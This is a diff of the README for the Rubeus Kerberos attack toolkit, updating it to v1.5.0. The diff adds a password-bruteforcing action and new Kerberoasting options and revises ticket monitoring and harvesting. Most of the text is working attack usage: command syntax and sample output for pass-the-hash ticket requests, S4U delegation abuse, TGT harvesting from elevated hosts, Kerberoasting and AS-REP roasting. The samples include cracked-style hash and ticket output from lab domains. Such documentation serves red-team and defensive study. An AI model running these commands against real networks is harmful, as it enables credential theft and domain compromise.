@@ -29,6 +29,7 @@ Rubeus is licensed under the BSD 3-Clause license.
     + [asktgt](#asktgt)
     + [asktgs](#asktgs)
     + [renew](#renew)
+    + [brute](#brute)
   * [Constrained delegation abuse](#constrained-delegation-abuse)
     + [s4u](#s4u)
   * [Ticket Management](#ticket-management)
@@ -51,42 +52,56 @@ Rubeus is licensed under the BSD 3-Clause license.
     + [changepw](#changepw)
     + [hash](#hash)
     + [tgssub](#tgssub)
+    + [currentluid](#currentluid)
   * [Compile Instructions](#compile-instructions)
     + [Targeting other .NET versions](#targeting-other-net-versions)
     + [Sidenote: Building Rubeus as a Library](#sidenote-building-rubeus-as-a-library)
     + [Sidenote: Running Rubeus Through PowerShell](#sidenote-running-rubeus-through-powershell)
-
+      - [Sidenote Sidenote: Running Rubeus Over PSRemoting](#sidenote-sidenote-running-rubeus-over-psremoting)
 
 ## Background
 
 ### Command Line Usage
 
-    Ticket requests and renewals:
+       ______        _
+      (_____ \      | |
+       _____) )_   _| |__  _____ _   _  ___
+      |  __  /| | | |  _ \| ___ | | | |/___)
+      | |  \ \| |_| | |_) ) ____| |_| |___ |
+      |_|   |_|____/|____/|_____)____/(___/
 
-        Retrieve a TGT based on a user password/hash, optionally applying to the current logon session or a specific LUID:
-            Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ptt] [/luid]
+      v1.5.0
+
+
+     Ticket requests and renewals:
+
+        Retrieve a TGT based on a user password/hash, optionally saving to a file or applying to the current logon session or a specific LUID:
+            Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap]
 
         Retrieve a TGT based on a user password/hash, start a /netonly process, and to apply the ticket to the new process/logon session:
-            Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> /createnetonly:C:\Windows\System32\cmd.exe [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER]
+            Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> /createnetonly:C:\Windows\System32\cmd.exe [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/nowrap]
 
-        Retrieve a service ticket for one or more SPNs, optionally applying the ticket:
-            Rubeus.exe asktgs </ticket:BASE64 | /ticket:FILE.KIRBI> </service:SPN1,SPN2,...> [/dc:DOMAIN_CONTROLLER] [/ptt]
+        Retrieve a service ticket for one or more SPNs, optionally saving or applying the ticket:
+            Rubeus.exe asktgs </ticket:BASE64 | /ticket:FILE.KIRBI> </service:SPN1,SPN2,...> [/enctype:DES|RC4|AES128|AES256] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap]
 
-        Renew a TGT, optionally applying the ticket or auto-renewing the ticket up to its renew-till limit:
-            Rubeus.exe renew </ticket:BASE64 | /ticket:FILE.KIRBI> [/dc:DOMAIN_CONTROLLER] [/ptt] [/autorenew]
+        Renew a TGT, optionally applying the ticket, saving it, or auto-renewing the ticket up to its renew-till limit:
+            Rubeus.exe renew </ticket:BASE64 | /ticket:FILE.KIRBI> [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/autorenew] [/nowrap]
 
-        Perform a bruteforcing attack against Kerberos:
-            Rubeus.exe brute  </password:PASSWORD | /passwords:PASSWORDS_FILE> [/user:USER | /users:USERS_FILE] [/domain:DOMAIN] [/creduser:DOMAIN\\USER & /credpassword:PASSWORD] [/ou:ORGANIZATION_UNIT] [/dc:DOMAIN_CONTROLLER] [/outfile:RESULT_PASSWORD_FILE] [/noticket] [/verbose]
+        Perform a Kerberos-based password bruteforcing attack:
+            Rubeus.exe brute </password:PASSWORD | /passwords:PASSWORDS_FILE> [/user:USER | /users:USERS_FILE] [/domain:DOMAIN] [/creduser:DOMAIN\\USER & /credpassword:PASSWORD] [/ou:ORGANIZATION_UNIT] [/dc:DOMAIN_CONTROLLER] [/outfile:RESULT_PASSWORD_FILE] [/noticket] [/verbose] [/nowrap]
 
 
-    Constrained delegation abuse:
+     Constrained delegation abuse:
 
         Perform S4U constrained delegation abuse:
-            Rubeus.exe s4u </ticket:BASE64 | /ticket:FILE.KIRBI> </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI> /msdsspn:SERVICE/SERVER [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/ptt]
-            Rubeus.exe s4u /user:USER </rc4:HASH | /aes256:HASH> [/domain:DOMAIN] </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI> /msdsspn:SERVICE/SERVER [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/ptt]
+            Rubeus.exe s4u </ticket:BASE64 | /ticket:FILE.KIRBI> </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI> /msdsspn:SERVICE/SERVER [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap]
+            Rubeus.exe s4u /user:USER </rc4:HASH | /aes256:HASH> [/domain:DOMAIN] </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI> /msdsspn:SERVICE/SERVER [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap]
+
+        Perform S4U constrained delegation abuse across domains:
+            Rubeus.exe s4u /user:USER </rc4:HASH | /aes256:HASH> [/domain:DOMAIN] </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI> /msdsspn:SERVICE/SERVER /targetdomain:DOMAIN.LOCAL /targetdc:DC.DOMAIN.LOCAL [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/nowrap]
 
 
-    Ticket management:
+     Ticket management:
 
         Submit a TGT, optionally targeting a specific LUID (if elevated):
             Rubeus.exe ptt </ticket:BASE64 | /ticket:FILE.KIRBI> [/luid:LOGINID]
@@ -98,64 +113,73 @@ Rubeus is licensed under the BSD 3-Clause license.
             Rubeus.exe describe </ticket:BASE64 | /ticket:FILE.KIRBI>
 
 
-    Ticket extraction and harvesting:
+     Ticket extraction and harvesting:
 
         Triage all current tickets (if elevated, list for all users), optionally targeting a specific LUID, username, or service:
-            Rubeus.exe triage [/luid:LOGINID] [/user:USER] [/service:LDAP]
+            Rubeus.exe triage [/luid:LOGINID] [/user:USER] [/service:krbtgt] [/server:BLAH.DOMAIN.COM]
 
         List all current tickets in detail (if elevated, list for all users), optionally targeting a specific LUID:
-            Rubeus.exe klist [/luid:LOGINID]
+            Rubeus.exe klist [/luid:LOGINID] [/user:USER] [/service:krbtgt] [/server:BLAH.DOMAIN.COM]
 
         Dump all current ticket data (if elevated, dump for all users), optionally targeting a specific service/LUID:
-            Rubeus.exe dump [/service:SERVICE] [/luid:LOGINID]
+            Rubeus.exe dump [/luid:LOGINID] [/user:USER] [/service:krbtgt] [/server:BLAH.DOMAIN.COM] [/nowrap]
 
         Retrieve a usable TGT .kirbi for the current user (w/ session key) without elevation by abusing the Kerberos GSS-API, faking delegation:
             Rubeus.exe tgtdeleg [/target:SPN]
 
-        Monitor every SECONDS (default 60) for 4624 logon events and dump any TGT data for new logon sessions:
-            Rubeus.exe monitor [/interval:SECONDS] [/filteruser:USER] [/registry:SOFTWARENAME]
+        Monitor every /interval SECONDS (default 60) for new TGTs:
+            Rubeus.exe monitor [/interval:SECONDS] [/targetuser:USER] [/nowrap] [/registry:SOFTWARENAME]
 
-        Monitor every MINUTES (default 60) for 4624 logon events, dump any new TGT data, and auto-renew TGTs that are about to expire:
-            Rubeus.exe harvest [/interval:MINUTES] [/registry:SOFTWARENAME]
+        Monitor every /monitorinterval SECONDS (default 60) for new TGTs, auto-renew TGTs, and display the working cache every /displayinterval SECONDS (default 1200):
+            Rubeus.exe harvest [/monitorinterval:SECONDS] [/displayinterval:SECONDS] [/targetuser:USER] [/nowrap] [/registry:SOFTWARENAME]
 
 
-    Roasting:
+     Roasting:
 
         Perform Kerberoasting:
-            Rubeus.exe kerberoast [/spn:"blah/blah"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."]
+            Rubeus.exe kerberoast [/spn:"blah/blah"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/nowrap]
 
         Perform Kerberoasting, outputting hashes to a file:
             Rubeus.exe kerberoast /outfile:hashes.txt [/spn:"blah/blah"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."]
 
+        Perform Kerberoasting, outputting hashes in the file output format, but to the console:
+            Rubeus.exe kerberoast /simple [/spn:"blah/blah"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/nowrap]
+
         Perform Kerberoasting with alternate credentials:
-            Rubeus.exe kerberoast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/spn:"blah/blah"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."]
+            Rubeus.exe kerberoast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/spn:"blah/blah"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/nowrap]
 
         Perform Kerberoasting with an existing TGT:
-            Rubeus.exe kerberoast /spn:"blah/blah" </ticket:BASE64 | /ticket:FILE.KIRBI>
+            Rubeus.exe kerberoast /spn:"blah/blah" </ticket:BASE64 | /ticket:FILE.KIRBI> [/nowrap]
 
         Perform Kerberoasting using the tgtdeleg ticket to request service tickets - requests RC4 for AES accounts:
-            Rubeus.exe kerberoast /usetgtdeleg
+            Rubeus.exe kerberoast /usetgtdeleg [/nowrap]
 
         Perform "opsec" Kerberoasting, using tgtdeleg, and filtering out AES-enabled accounts:
-            Rubeus.exe kerberoast /rc4opsec
+            Rubeus.exe kerberoast /rc4opsec [/nowrap]
+
+        List statistics about found Kerberoastable accounts without actually sending ticket requests:
+            Rubeus.exe kerberoast /stats [/nowrap]
+
+        Perform Kerberoasting, requesting tickets only for accounts with an admin count of 1 (custom LDAP filter):
+            Rubeus.exe kerberoast /ldapfilter:'admincount=1' [/nowrap]
 
         Perform Kerberoasting, requesting tickets only for accounts whose password was last set between 01-31-2005 and 03-29-2010, returning up to 5 service tickets:
-            Rubeus.exe kerberoast /pwdsetafter:01-31-2005 /pwdsetbefore:03-29-2010 /resultlimit:1
+            Rubeus.exe kerberoast /pwdsetafter:01-31-2005 /pwdsetbefore:03-29-2010 /resultlimit:5 [/nowrap]
 
         Perform AES Kerberoasting:
-            Rubeus.exe kerberoast /aes
+            Rubeus.exe kerberoast /aes [/nowrap]
 
         Perform AS-REP "roasting" for any users without preauth:
-            Rubeus.exe asreproast [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."]
+            Rubeus.exe asreproast [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/nowrap]
 
         Perform AS-REP "roasting" for any users without preauth, outputting Hashcat format to a file:
             Rubeus.exe asreproast /outfile:hashes.txt /format:hashcat [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."]
 
         Perform AS-REP "roasting" for any users without preauth using alternate credentials:
-            Rubeus.exe asreproast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU,..."]
+            Rubeus.exe asreproast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU,..."] [/nowrap]
 
 
-    Miscellaneous:
+     Miscellaneous:
 
         Create a hidden program (unless /show is passed) with random /netonly credentials, displaying the PID and LUID:
             Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" [/show]
@@ -166,10 +190,21 @@ Rubeus is licensed under the BSD 3-Clause license.
         Calculate rc4_hmac, aes128_cts_hmac_sha1, aes256_cts_hmac_sha1, and des_cbc_md5 hashes:
             Rubeus.exe hash /password:X [/user:USER] [/domain:DOMAIN]
 
+        Substitute an sname or SPN into an existing service ticket:
+            Rubeus.exe tgssub </ticket:BASE64 | /ticket:FILE.KIRBI> /altservice:ldap [/ptt] [/luid] [/nowrap]
+            Rubeus.exe tgssub </ticket:BASE64 | /ticket:FILE.KIRBI> /altservice:cifs/computer.domain.com [/ptt] [/luid] [/nowrap]
+        
+        Display the current user's LUID:
+            Rubeus.exe currentluid
 
-    NOTE: Base64 ticket blobs can be decoded with :
+        The "/consoleoutfile:C:\FILE.txt" argument redirects all console output to the file specified.
 
-        [IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("aa..."))
+        The "/nowrap" flag prevents any base64 ticket blobs from being column wrapped for any function.
+
+
+     NOTE: Base64 ticket blobs can be decoded with :
+
+        [IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("aa...")
 
 
 ### Opsec Notes
@@ -241,6 +276,7 @@ Breakdown of the ticket request commands:
 | [asktgt](#asktgt) | Request a ticket-granting-ticket (TGT) from a hash/key or password |
 | [asktgs](#asktgs) | Request a service ticket from a passed TGT |
 | [renew](#renew) | Renew (or autorenew) a TGT or service ticket |
+| [brute](#brute) | Perform a Kerberos-based password bruteforcing attack |
 
 
 ### asktgt
@@ -558,6 +594,31 @@ The `/autorenew` flag will take an existing `/ticket:X` .kirbi file/blob, sleep 
     [*] base64(ticket.kirbi):
 
           doIFmjCCBZagAwIBBaEDAgEWoo...(snip)...
+
+
+### brute
+
+The **brute** action will perform a Kerberos-based password bruteforcing attack.
+
+    C:\Rubeus>Rubeus.exe brute /password:Password123!! /noticket
+
+       ______        _
+      (_____ \      | |
+       _____) )_   _| |__  _____ _   _  ___
+      |  __  /| | | |  _ \| ___ | | | |/___)
+      | |  \ \| |_| | |_) ) ____| |_| |___ |
+      |_|   |_|____/|____/|_____)____/(___/
+
+      v1.5.0
+
+    [-] Blocked/Disabled user => Guest
+    [-] Blocked/Disabled user => DefaultAccount
+    [-] Blocked/Disabled user => krbtgt
+    [-] Blocked/Disabled user => disabled
+    [+] STUPENDOUS => newuser:Password123!!
+    [*] base64(newuser.kirbi):
+
+          doIFLDCCBSigAwIBBaEDAgEWooIELDCCBChhggQkMIIEIKADAgEFoRAbDlR...(snip)...
 
 
 ## Constrained delegation abuse
@@ -1531,13 +1592,15 @@ If automatic target/domain extraction is failing, a known SPN of a service confi
 
 ### monitor
 
-The **monitor** action will monitor the event log for 4624 logon events and will extract any new TGT tickets for the new logon IDs (LUIDs). The `/interval:X` parameter (in seconds, default of 60) specifies how often to check the event log. A `/filteruser:USER` can be specified, returning only ticket data for said user. This function is especially useful on servers with unconstrained delegation enabled ;)
+The **monitor** action will periodically extract all TGTs every `/monitorinterval:X` seconds (default of 60) and display any newly captured TGTs. A `/targetuser:USER` can be specified, returning only ticket data for said user. This function is especially useful on servers with unconstrained delegation enabled ;)
 
-When the `/filteruser:USER` (or if not specified, any user) creates a new 4624 logon event, any extracted TGT KRB-CRED data is output.
+When the `/targetuser:USER` (or if not specified, any user) creates a new 4624 logon event, any extracted TGT KRB-CRED data is output.
+
+The `/nowrap` flag causes the base64 encoded ticket output to no wrap per line.
 
 Further, if you wish to save the output to the registry, pass the `/registry` flag and specfiy a path under HKLM to create (e.g., `/registry:SOFTWARE\MONITOR`). Then you can remove this entry after you've finished running Rubeus by `Get-Item HKLM:\SOFTWARE\MONITOR\ | Remove-Item -Recurse -Force`.
 
-    c:\Rubeus>Rubeus.exe monitor /filteruser:dfm.a
+    c:\Rubeus>Rubeus.exe monitor /targetuser:DC$ /interval:10
 
        ______        _
       (_____ \      | |
@@ -1546,58 +1609,37 @@ Further, if you wish to save the output to the registry, pass the `/registry` fl
       | |  \ \| |_| | |_) ) ____| |_| |___ |
       |_|   |_|____/|____/|_____)____/(___/
 
-      v1.0.0
+      v1.5.0
 
     [*] Action: TGT Monitoring
-    [*] Monitoring every 60 seconds for 4624 logon events
-    [*] Target user : dfm.a
+    [*] Target user     : DC$
+    [*] Monitoring every 10 seconds for new TGTs
 
 
-    [+] 9/17/2018 7:59:02 PM - 4624 logon event for 'TESTLAB.LOCAL\dfm.a' from '192.168.52.100'
-    [*] Target LUID     : 0x991972
-    [*] Target service  : krbtgt
+    [*] 12/21/2019 11:10:16 PM UTC - Found new TGT:
 
-      UserName                 : dfm.a
-      Domain                   : TESTLAB
-      LogonId                  : 10033522
-      UserSID                  : S-1-5-21-883232822-274137685-4173207997-1110
-      AuthenticationPackage    : Kerberos
-      LogonType                : Network
-      LogonTime                : 9/18/2018 2:59:02 AM
-      LogonServer              :
-      LogonServerDNSDomain     : TESTLAB.LOCAL
-      UserPrincipalName        :
+      User                  :  DC$@THESHIRE.LOCAL
+      StartTime             :  12/21/2019 2:44:31 PM
+      EndTime               :  12/21/2019 3:44:31 PM
+      RenewTill             :  12/28/2019 2:13:06 PM
+      Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
+      Base64EncodedTicket   :
 
-        ServiceName              : krbtgt
-        TargetName               :
-        ClientName               : dfm.a
-        DomainName               : TESTLAB.LOCAL
-        TargetDomainName         : TESTLAB.LOCAL
-        AltTargetDomainName      : TESTLAB.LOCAL
-        SessionKeyType           : aes256_cts_hmac_sha1
-        Base64SessionKey         : orxXJZ/r7zbDvo2JUyFfi+2ygcZpxH8e6phGUT5zDbc=
-        KeyExpirationTime        : 12/31/1600 4:00:00 PM
-        TicketFlags              : name_canonicalize, renewable, forwarded, forwardable
-        StartTime                : 9/17/2018 7:59:02 PM
-        EndTime                  : 9/18/2018 12:58:59 AM
-        RenewUntil               : 9/24/2018 7:58:59 PM
-        TimeSkew                 : 0
-        EncodedTicketSize        : 1470
-        Base64EncodedTicket      :
+        doIFFDCCBRCgAwIBBaEDAgEWoo...(snip)...
 
-          doIFujCCBbagAwIBBaE...(snip)...
+    [*] Ticket cache size: 1
 
-
-    [*] Extracted  1 total tickets
 
 **Note that this action needs to be run from an elevated context!**
 
 
 ### harvest
 
-The **harvest** action takes [monitor](#monitor) one step further. It monitors the event log for 4624 events every `/interval:MINUTES` for new logons, extracts any new TGT KRB-CRED files, and keeps a cache of any extracted TGTs. On the `/interval`, any TGTs that will expire before the next interval are automatically renewed (up until their renewal limit), and the current cache of "usable"/valid TGT KRB-CRED .kirbis are output as base64 blobs.
+The **harvest** action takes [monitor](#monitor) one step further. It periodically extract all TGTs every `/monitorinterval:X` seconds (default of 60), extracts any new TGT KRB-CRED files, and keeps a cache of any extracted TGTs. Every interval, any TGTs that will expire before the next interval are automatically renewed (up until their renewal limit). Every `/displayinterval:X` seconds (default of 1200) and the current cache of "usable"/valid TGT KRB-CRED .kirbis are output as base64 blobs.
 
 This allows you to harvest usable TGTs from a system without opening up a read handle to LSASS, though elevated rights are needed to extract the tickets.
+
+The `/nowrap` flag causes the base64 encoded ticket output to no wrap per line.
 
 Further, if you wish to save the output to the registry, pass the `/registry` flag and specfiy a path under HKLM to create (e.g., `/registry:SOFTWARE\MONITOR`). Then you can remove this entry after you've finished running Rubeus by `Get-Item HKLM:\SOFTWARE\MONITOR\ | Remove-Item -Recurse -Force`.
 
@@ -1653,7 +1695,13 @@ The **kerberoast** action replaces the [SharpRoast](https://github.com/GhostPack
 
 With no other arguments, all user accounts with SPNs set in the current domain are Kerberoasted, _requesting their highest supported encryption type_ (see the [opsec table](#kerberoasting-opsec)). The `/spn:X` argument roasts just the specified SPN, the `/user:X` argument roasts just the specified user, and the `/ou:X` argument roasts just users in the specific OU. The `/domain` and `/dc` arguments are optional, pulling system defaults as other actions do.
 
+The `/stats` flag will output statistics about kerberoastable users found, including a breakdown of supported encryption types and years user passwords were last set. This flag can be combined with other targeting options.
+
 The `/outfile:FILE` argument outputs roasted hashes to the specified file, one per line.
+
+If the `/simple` flag is specified, roasted hashes will be output to the console, one per line.
+
+If the `/nowrap` flag is specified, Kerberoast results will not be line-wrapped.
 
 If the the TGT `/ticket:X` supplied (base64 encoding of a .kirbi file or the path to a .kirbi file on disk) that TGT is used to request the service service tickets during roasting. If `/ticket:X` is used with `/spn:Y` then no LDAP searching happens for users, so it can be done from a non-domain joined system in conjunction with `/dc:Z`.
 
@@ -1661,15 +1709,18 @@ If the `/tgtdeleg` flag is supplied, the [tgtdeleg](#tgtdeleg) trick it used to 
 
 If the `/aes` flag is supplied, accounts with AES encryption enabled in **msDS-SupportedEncryptionTypes** are enumerated and AES service tickets are requested.
 
+If the `/ldapfilter:X` argument is supplied, the supplied LDAP filter will be added to the final LDAP query used to find Kerberoastable users.
+
 If the `/rc4opsec` flag is specified, the **tgtdeleg** trick is used, and accounts **without** AES enabled are enumerated and roasted.
 
 If you want to use alternate domain credentials for Kerberoasting (and searching for users to Kerberoast), they can be specified with `/creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD`.
 
-If the `/pwdsetafter:MM-dd-yyyy` flag is supplied, only accounts whose password was last changed after MM-dd-yyyy will be enumerated and roasted.
+If the `/pwdsetafter:MM-dd-yyyy` argument is supplied, only accounts whose password was last changed after MM-dd-yyyy will be enumerated and roasted.
 
-If the `/pwdsetbefore:MM-dd-yyyy` flag is supplied, only accounts whose password was last changed before MM-dd-yyyy will be enumerated and roasted.
+If the `/pwdsetbefore:MM-dd-yyyy` argument is supplied, only accounts whose password was last changed before MM-dd-yyyy will be enumerated and roasted.
 
-If the `/resultlimit:NUMBER` flag is specified, the number of accounts that will be enumerated and roasted is limited to NUMBER.
+If the `/resultlimit:NUMBER` argument is specified, the number of accounts that will be enumerated and roasted is limited to NUMBER.
+
 
 #### kerberoasting opsec
 
@@ -1687,7 +1738,9 @@ Here is a table comparing the behavior of various flags from an opsec perspectiv
 | **/pwdsetbefore:X** | Use the supplied date and only enumerate accounts with password last changed before that date |
 | **/resultlimit:X** | Use the specified number to limit the accounts that will be roasted |
 
-Kerberoasting all users in the current domain:
+#### Examples
+
+Kerberoasting all users in the current domain using the default `KerberosRequestorSecurityToken.GetRequest` method:
 
     C:\Rubeus>Rubeus.exe kerberoast
 
@@ -1714,30 +1767,8 @@ Kerberoasting all users in the current domain:
     [*] DistinguishedName      : CN=SQL,CN=Users,DC=testlab,DC=local
     [*] ServicePrincipalName   : MSSQLSvc/SQL.testlab.local
     [*] Hash                   : $krb5tgs$23$*$testlab.local$MSSQLSvc/SQL.testlab.local*$E2B3869290...(snip)...
-
-
-    [*] SamAccountName         : patsy
-    [*] DistinguishedName      : CN=patsy,CN=Users,DC=testlab,DC=local
-    [*] ServicePrincipalName   : blah/nonexistent
-    [*] Hash                   : $krb5tgs$23$*$testlab.local$blah/nonexistent*$139799341096C26C727D...(snip)...
-
-
-    [*] SamAccountName         : andy
-    [*] DistinguishedName      : CN=andy,CN=Users,DC=testlab,DC=local
-    [*] ServicePrincipalName   : blah/blah
-    [*] Hash                   : $krb5tgs$23$*$testlab.local$blah/blah*$83E94269D80BD2466AB05F1F557...(snip)...
-
-
-    [*] SamAccountName         : testuser2
-    [*] DistinguishedName      : CN=testuser2,OU=TestingOU,DC=testlab,DC=local
-    [*] ServicePrincipalName   : service/host
-    [*] Hash                   : $krb5tgs$23$*$testlab.local$service/host*$5E231977A1E3D3E4BD8FBC2A...(snip)...
-
-
-    [*] SamAccountName         : constraineduser
-    [*] DistinguishedName      : CN=constraineduser,CN=Users,DC=testlab,DC=local
-    [*] ServicePrincipalName   : BLAH123/BLAH123
-    [*] Hash                   : $krb5tgs$23$*$testlab.local$BLAH123/BLAH123*$7488D1379F05ADEDE5C20...(snip)...
+    
+    ...(snip)...
 
 
 Kerberoasting all users in a specific OU, saving the hashes to an output file:
@@ -1766,51 +1797,123 @@ Kerberoasting all users in a specific OU, saving the hashes to an output file:
     [*] Roasted hashes written to : C:\Temp\hashes.txt
 
 
-Kerberoasting a specific user:
+Perform Kerberoasting using the `tgtdeleg` trick to get a usable TGT, requesting tickets only for accounts whose password was last set between 01-31-2005 and 03-29-2010, returning up to 3 service tickets:
 
-    C:\Rubeus>Rubeus.exe kerberoast /user:sqlservice
+    C:\Rubeus>Rubeus.exe kerberoast /tgtdeleg /pwdsetafter:01-31-2005 /pwdsetbefore:03-29-2010 /resultlimit:3
 
-     ______        _
-    (_____ \      | |
-     _____) )_   _| |__  _____ _   _  ___
-    |  __  /| | | |  _ \| ___ | | | |/___)
-    | |  \ \| |_| | |_) ) ____| |_| |___ |
-    |_|   |_|____/|____/|_____)____/(___/
+       ______        _
+      (_____ \      | |
+       _____) )_   _| |__  _____ _   _  ___
+      |  __  /| | | |  _ \| ___ | | | |/___)
+      | |  \ \| |_| | |_) ) ____| |_| |___ |
+      |_|   |_|____/|____/|_____)____/(___/
 
-    v1.3.4
+      v1.5.0
+
 
     [*] Action: Kerberoasting
 
-    [*] Target User            : sqlservice
+    [*] Using 'tgtdeleg' to request a TGT for the current user
+    [*] RC4_HMAC will be the requested for AES-enabled accounts, all etypes will be requested for everything else
+    [*] Searching the current domain for Kerberoastable users
+    [*] Searching for accounts with lastpwdset from 01-31-2005 to 03-29-2010
+    [*] Up to 3 result(s) will be returned
 
-    [*] SamAccountName         : sqlservice
-    [*] DistinguishedName      : CN=SQL,CN=Users,DC=testlab,DC=local
-    [*] ServicePrincipalName   : MSSQLSvc/SQL.testlab.local
-    [*] Hash                   : $krb5tgs$23$*sqlservice$testlab.local$MSSQLSvc/SQL.testlab.local*$E2B386...(snip)...
+    [*] Total kerberoastable users : 3
 
 
-Kerberoasting a specific SPN:
+    [*] SamAccountName         : harmj0y
+    [*] DistinguishedName      : CN=harmj0y,OU=TestOU,DC=theshire,DC=local
+    [*] ServicePrincipalName   : testspn/server
+    [*] PwdLastSet             : 5/31/2008 12:00:02 AM
+    [*] Supported ETypes       : AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96
+    [*] Hash                   : $krb5tgs$23$*harmj0y$theshire.local$testspn/server*$F6EEFE5026CF8F02E3DC...(snip)...
 
-    C:\Rubeus>Rubeus.exe kerberoast /spn:MSSQLSvc/SQL.testlab.local
 
-     ______        _
-    (_____ \      | |
-     _____) )_   _| |__  _____ _   _  ___
-    |  __  /| | | |  _ \| ___ | | | |/___)
-    | |  \ \| |_| | |_) ) ____| |_| |___ |
-    |_|   |_|____/|____/|_____)____/(___/
+    [*] SamAccountName         : constraineduser
+    [*] DistinguishedName      : CN=constraineduser,CN=Users,DC=theshire,DC=local
+    [*] ServicePrincipalName   : blah/blah123
+    [*] PwdLastSet             : 9/5/2009 7:48:50 PM
+    [*] Supported ETypes       : RC4_HMAC
+    [*] Hash                   : $krb5tgs$23$*constraineduser$theshire.local$blah/blah123*$6F0992C377AA12...(snip)...
 
-    v1.3.3
+
+    [*] SamAccountName         : newuser
+    [*] DistinguishedName      : CN=newuser,CN=Users,DC=theshire,DC=local
+    [*] ServicePrincipalName   : blah/blah123456
+    [*] PwdLastSet             : 9/12/2008 8:05:16 PM
+    [*] Supported ETypes       : RC4_HMAC, AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96
+    [*] Hash                   : $krb5tgs$23$*newuser$theshire.local$blah/blah123456*$C4561559C2A7DF07712...(snip)...
+
+
+List statistics about found Kerberoastable accounts without actually sending ticket requests:
+
+    C:\Rubeus>Rubeus.exe kerberoast /stats
+
+       ______        _
+      (_____ \      | |
+       _____) )_   _| |__  _____ _   _  ___
+      |  __  /| | | |  _ \| ___ | | | |/___)
+      | |  \ \| |_| | |_) ) ____| |_| |___ |
+      |_|   |_|____/|____/|_____)____/(___/
+
+      v1.5.0
+
 
     [*] Action: Kerberoasting
 
-    [*] Target SPN             : MSSQLSvc/SQL.testlab.local
-    [*] Hash                   : $krb5tgs$23$*$DOMAIN$MSSQLSvc/SQL.testlab.local*$E2B3869290BA2AD82...(snip)...
+    [*] Listing statistics about target users, no ticket requests being performed.
+    [*] Searching the current domain for Kerberoastable users
+
+    [*] Total kerberoastable users : 4
 
 
-Kerberoasting all users in a foreign _trusting_ domain:
+     ----------------------------------------------------------------------
+     | Supported Encryption Type                                  | Count |
+     ----------------------------------------------------------------------
+     | RC4_HMAC_DEFAULT                                           | 1     |
+     | RC4_HMAC                                                   | 1     |
+     | AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96           | 1     |
+     | RC4_HMAC, AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96 | 1     |
+     ----------------------------------------------------------------------
 
-    C:\Rubeus>Rubeus.exe kerberoast /domain:dev.testlab.local
+     ----------------------------------
+     | Password Last Set Year | Count |
+     ----------------------------------
+     | 2019                   | 4     |
+     ----------------------------------
+
+
+Kerberoasting a specific user, with simplified hash output:
+
+    C:\Rubeus>Rubeus.exe kerberoast /user:harmj0y /simple
+
+       ______        _
+      (_____ \      | |
+       _____) )_   _| |__  _____ _   _  ___
+      |  __  /| | | |  _ \| ___ | | | |/___)
+      | |  \ \| |_| | |_) ) ____| |_| |___ |
+      |_|   |_|____/|____/|_____)____/(___/
+
+      v1.5.0
+
+
+    [*] Action: Kerberoasting
+
+    [*] NOTICE: AES hashes will be returned for AES-enabled accounts.
